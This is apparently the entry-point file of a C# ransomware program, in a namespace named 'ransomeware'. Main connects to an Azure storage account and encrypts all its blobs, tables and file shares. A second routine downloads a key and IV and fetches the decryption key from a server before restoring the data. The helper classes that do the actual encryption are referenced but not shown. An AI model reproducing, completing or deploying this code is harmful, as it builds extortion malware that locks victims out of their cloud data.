using Microsoft.WindowsAzure.Storage;
using ransomeware1;
using System.IO;
using System.Threading.Tasks;


namespace ransomeware
{
    class Program
    {
        public static void Main(string[] args)
        {
            // Utils.encryptAES();

            CloudStorageAccount storageAccount = Utils.Connect();

            AESEncryption encrypt = new AESEncryption();

            Blob_Storage.EncryptBlobs(storageAccount, encrypt);

            Table_Storage.EncryptTables(storageAccount, encrypt);

            File_Storage.EncryptFiles(storageAccount, encrypt);

            encrypt.OnFinishEncryption(storageAccount);
            
        }

        static async Task tryCrypto(CloudStorageAccount storageAccount)
        {
            AESDecryption dec = new AESDecryption();

            Utils.Download(storageAccount, "key");
            Utils.Download(storageAccount, "IV");

            await dec.retrieveKeyFromServer(File.ReadAllBytes("./key.txt"),
                File.ReadAllBytes("./IV.txt"));
            
            Blob_Storage.DecryptBlobs(storageAccount, dec);

            Table_Storage.DecryptTables(storageAccount, dec);

            File_Storage.DecryptFiles(storageAccount, dec);

        }
    }
}
